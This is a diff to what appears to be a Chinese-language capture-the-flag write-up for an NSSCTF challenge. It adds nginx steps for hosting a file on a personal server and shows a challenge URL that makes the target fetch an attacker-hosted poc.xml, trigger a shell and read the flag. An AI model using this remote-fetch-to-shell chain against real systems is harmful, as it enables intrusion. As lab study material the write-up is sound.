@@ -49,9 +49,36 @@ public class POC {
 
 >   将上面的文件放在服务器上，并设置对外可访问
 
+```nginx
+设置服务器文件对外开放方法：
+	# 阿里云轻量级服务器方法
+	1、防火墙开放端口
+	2、服务器中开放端口
+	3、添加nginx配置
+		cd /etc/nginx/sites-enabled/		
+	4、vim test.conf
+	# 输入以下
+    server {
+        listen 9999;
+        listen [::]:9999;
+
+        server_name 112.124.52.200;
+
+        location / {
+            root /var/www/expose;
+
+        }
+    }
+	5、测试语法正确然后重新加载配置文件
+	nginx -t
+	systemctl reload nginx.service
+```
+
+
+
 >   原题访问：`http://node4.anna.nssctf.cn:28045/Flag?filename=http://服务器地址:7777/poc.xml`
 >
->   触发shell，然后获取flag
+>   服务器开启端口监听，触发shell，输入命令获取flag
 
 ```nginx
 root@4d0d39411c944bf6:/# cat /flag_*
